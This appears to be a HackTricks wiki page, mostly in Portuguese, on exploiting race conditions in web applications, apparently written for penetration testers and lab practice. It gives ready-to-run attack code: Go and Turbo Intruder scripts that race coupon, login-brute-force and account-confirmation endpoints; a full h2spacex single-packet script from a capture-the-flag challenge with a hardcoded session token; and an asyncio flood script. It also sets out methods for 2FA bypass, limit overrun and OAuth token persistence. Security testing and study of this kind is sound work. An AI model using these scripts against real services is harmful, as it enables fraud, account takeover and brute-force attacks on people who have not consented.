# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Para obter uma compreensão profunda desta técnica, consulte o relatório original em [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Aprimorando ataques de Race Condition

O principal obstáculo para explorar race conditions é garantir que múltiplas requisições sejam tratadas ao mesmo tempo, com **diferença muito pequena nos seus tempos de processamento — idealmente, menos de 1ms**.

Aqui você pode encontrar algumas técnicas para sincronizar requisições:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Suporta o envio de duas requisições por uma única conexão TCP, reduzindo o impacto da jitter de rede. No entanto, devido a variações do lado do servidor, duas requisições podem não ser suficientes para um exploit consistente de race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Permite o pré-envio da maior parte de 20-30 requisições, retendo um pequeno fragmento, que é então enviado em conjunto, alcançando chegada simultânea no servidor.

**Preparation for Last-Byte Sync** envolve:

1. Enviar headers e body data menos o byte final sem encerrar o stream.
2. Pausar por 100ms após o envio inicial.
3. Desabilitar TCP_NODELAY para utilizar Nagle's algorithm e agrupar os frames finais.
4. Enviar ping para aquecer a conexão.

O envio subsequente dos frames retidos deve resultar na chegada deles em um único pacote, verificável via Wireshark. Este método não se aplica a arquivos estáticos, que normalmente não estão envolvidos em RC attacks.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 roda sobre QUIC (UDP). Não existe coalescência de TCP nem Nagle para se apoiar, então o clássico last‑byte sync não funciona com clientes padrão. Em vez disso, é preciso coalescer deliberadamente múltiplos QUIC stream‑final DATA frames (FIN) no mesmo datagrama UDP para que o servidor processe todas as requisições alvo no mesmo scheduling tick.
- **How to do it**: Use uma biblioteca purpose‑built que exponha o controle de frames QUIC. Por exemplo, H3SpaceX manipula quic-go para implementar HTTP/3 last‑frame synchronization tanto para requests com body quanto para GET‑style requests sem body.
- Requests‑with‑body: enviar HEADERS + DATA menos o último byte para N streams, então flushar o byte final de cada stream juntos.
- GET‑style: craft fake DATA frames (ou um tiny body com Content‑Length) e encerrar todos os streams em um único datagrama.
- **Practical limits**:
- A concorrência é limitada pelo parâmetro de transporte QUIC max_streams do peer (semelhante ao SETTINGS_MAX_CONCURRENT_STREAMS do HTTP/2). Se estiver baixo, abra múltiplas conexões H3 e distribua a race entre elas.
- O tamanho do datagrama UDP e o path MTU limitam quantos stream‑final frames você pode coalescer. A biblioteca trata da divisão em múltiplos datagramas se necessário, mas um flush em um único datagrama é mais confiável.
- **Practice**: Existem labs públicos de race H2/H3 e exploits de exemplo que acompanham o H3SpaceX.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimal example</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Adaptando-se à Arquitetura do Servidor

Compreender a arquitetura do alvo é crucial. Servidores front-end podem rotear requisições de forma diferente, afetando o tempo de resposta. O aquecimento preemptivo de conexões no lado do servidor, por meio de requisições inconsequentes, pode normalizar o tempo de resposta.

#### Lidando com bloqueio baseado em sessão

Frameworks como o PHP's session handler serializam requisições por sessão, potencialmente ocultando vulnerabilidades. Utilizar tokens de sessão diferentes para cada requisição pode contornar esse problema.

#### Superando limites de taxa ou de recursos

Se o aquecimento de conexão for ineficaz, acionar intencionalmente atrasos de limite de taxa ou de recursos dos servidores web por meio de uma enxurrada de requisições dummy pode facilitar o single-packet attack ao induzir um atraso no servidor favorável a condições de corrida.

## Exemplos de Ataque

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Você pode enviar a requisição para o **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), pode alterar na requisição o valor que deseja testar por brute force em **`%s`** como em `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` e então selecionar a **`examples/race-single-packer-attack.py`** do menu suspenso:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Se você for **enviar valores diferentes**, pode modificar o código com este que usa uma wordlist da área de transferência:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Se o site não suportar HTTP2 (apenas HTTP1.1) use `Engine.THREADED` ou `Engine.BURP` em vez de `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Caso precise enviar uma requisição para 1 endpoint e depois várias para outros endpoints para acionar o RCE, você pode alterar o script `race-single-packet-attack.py` com algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Também está disponível no **Repeater** via a nova opção '**Send group in parallel**' no Burp Suite.
- Para **limit-overrun** você pode simplesmente adicionar a **mesma request 50 vezes** no grupo.
- Para **connection warming**, você pode **add** no **beginning** do **group** algumas **requests** para alguma parte não estática do web server.
- Para **delaying** o processo **between** processar **one request and another** em 2 substates steps, você pode **add extra requests between** as duas requests.
- Para um **multi-endpoint** RC você pode começar enviando a **request** que **goes to the hidden state** e então **50 requests** logo depois que **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: O objetivo deste script é alterar o email de um usuário enquanto o verifica continuamente até que o token de verificação do novo email chegue ao último email (isso porque no código foi identificado um RC onde era possível modificar um email mas a verificação era enviada para o antigo, porque a variável que indicava o email já estava populada com o primeiro).\
Quando a palavra "objetivo" é encontrada nos emails recebidos sabemos que recebemos o token de verificação do email alterado e encerramos o ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Seleção do Engine: utilize `Engine.BURP2` em alvos HTTP/2 para acionar o single‑packet attack; faça fallback para `Engine.THREADED` ou `Engine.BURP` para last‑byte sync em HTTP/1.1.
- `gate`/`openGate`: enfileire muitas cópias com `gate='race1'` (ou gates por tentativa), que retém a tail de cada request; `openGate('race1')` flushes todas as tails juntas para que cheguem quase simultaneamente.
- Diagnóstico: timestamps negativos no Turbo Intruder indicam que o servidor respondeu antes da request ser totalmente enviada, provando overlap. Isso é esperado em true races.
- Connection warming: envie um ping ou algumas requests inofensivas primeiro para estabilizar os timings; opcionalmente desative `TCP_NODELAY` para incentivar o batching dos frames finais.


### Aprimorando Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **limitação de janela de 65,535 B do TCP usando fragmentação na camada IP** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

Note that although this improvement makes the attack more reliable in RC that requires hundreds/thousands of packets to arrive at the same time, it might also have some software limitations. Some popular HTTP servers like Apache, Nginx and Go have a strict `SETTINGS_MAX_CONCURRENT_STREAMS` setting to 100, 128 and 250. However, others like NodeJS and nghttp2 have it unlimited.\
This basically means that Apache will only consider 100 HTTP connections from a single TCP connection (limiting this RC attack). For HTTP/3, the analogous limit is QUIC’s max_streams transport parameter – if it’s small, spread your race across multiple QUIC connections.

You can find some examples using this technique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Consulte os exemplos da seção anterior.
- **Intruder**: Envie a **request** para o **Intruder**, defina o **number of threads** para **30** dentro do **Options menu**, selecione como payload **Null payloads** e gere **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Limit-overrun / TOCTOU

Este é o tipo mais básico de race condition onde **vulnerabilidades** que **aparecem** em locais que **limitam o número de vezes que você pode realizar uma ação**. Como usar o mesmo código de desconto em uma loja web várias vezes. Um exemplo muito simples pode ser encontrado em [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou em [**this bug**](https://hackerone.com/reports/759247)**.**

Existem muitas variações desse tipo de ataque, incluindo:

- Resgatar um gift card múltiplas vezes
- Avaliar um produto várias vezes
- Sacar ou transferir dinheiro além do saldo da conta
- Reutilizar uma única solução de CAPTCHA
- Bypassar um anti-brute-force rate limit

### **Hidden substates**

Explorar race conditions complexas frequentemente envolve aproveitar breves oportunidades para interagir com substates de máquina ocultos ou **não intencionados**. Aqui está como abordar isso:

1. **Identify Potential Hidden Substates**
- Comece identificando endpoints que modificam ou interagem com dados críticos, como perfis de usuário ou processos de password reset. Foque em:
- **Storage**: Prefira endpoints que manipulam dados persistentes no server-side ao invés daqueles que lidam com dados no client-side.
- **Action**: Procure operações que alteram dados existentes, que têm mais probabilidade de criar condições exploráveis comparadas com operações que adicionam novos dados.
- **Keying**: Ataques bem-sucedidos geralmente envolvem operações keyed no mesmo identificador, por exemplo, username ou reset token.
2. **Conduct Initial Probing**
- Teste os endpoints identificados com ataques de race condition, observando qualquer desvio dos resultados esperados. Respostas inesperadas ou mudanças no comportamento da aplicação podem sinalizar uma vulnerabilidade.
3. **Demonstrate the Vulnerability**
- Reduza o ataque ao número mínimo de requests necessários para explorar a vulnerabilidade, frequentemente apenas dois. Esta etapa pode requerer múltiplas tentativas ou automação devido ao timing preciso envolvido.

### Time Sensitive Attacks

Precisão no timing das requests pode revelar vulnerabilidades, especialmente quando métodos previsíveis como timestamps são usados para security tokens. Por exemplo, gerar password reset tokens baseado em timestamps pode permitir tokens idênticos para requests simultâneas.

**To Exploit:**

- Use timing preciso, como um single-packet attack, para fazer concurrent password reset requests. Identical tokens indicam uma vulnerabilidade.

**Example:**

- Solicite dois password reset tokens ao mesmo tempo e compare-os. Tokens iguais sugerem uma falha na geração de token.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

Confira este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver como **pay** em uma store e **add an extra** item que você **won't need to pay for it**.

### Confirm other emails

A ideia é **verify an email address and change it to a different one at the same time** para descobrir se a plataforma verifica o novo email alterado.

### Change email to 2 emails addresses Cookie based

Segundo [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab foi vulnerável a takeover dessa forma porque poderia **send** o **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

Se **2 different writes** são usados para **add** **information** dentro de um **database**, existe uma pequena porção de tempo onde **apenas o primeiro dado foi escrito** dentro do database. Por exemplo, ao criar um usuário o **username** e **password** podem ser **escritos** e **depois o token** para confirmar a conta recém-criada é escrito. Isso significa que por um pequeno tempo o **token para confirmar uma conta é null**.

Portanto, **registrar uma conta e enviar várias requests com um token vazio** (`token=` or `token[]=` ou qualquer outra variação) para confirmar a conta imediatamente pode permitir c**onfirmar uma conta** onde você não controla o email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

O seguinte pseudo-code é vulnerável a race condition porque em um tempo muito pequeno o **2FA is not enforced** enquanto a session é criada:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application <InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

O **problema** aparece quando você **aceita** e automaticamente envia um **`authorization_code`** para a aplicação maliciosa. Então, essa **aplicação abusa de uma Race Condition in the OAUth service provider para gerar mais that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** for your account. Basicamente, irá abusar do fato de que você aceitou a aplicação acessar seus dados para **criar várias contas**. Depois, se você **parar de permitir que a aplicação acesse seus dados um par de AT/RT será deletado, mas os outros ainda permanecerão válidos**.

#### Race Condition in `Refresh Token`

Uma vez que você tenha **obtido um RT válido** você pode tentar **abusar dele para gerar vários AT/RT** e **mesmo que o usuário cancele as permissões** para a aplicação maliciosa acessar seus dados, **vários RTs ainda permanecerão válidos.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
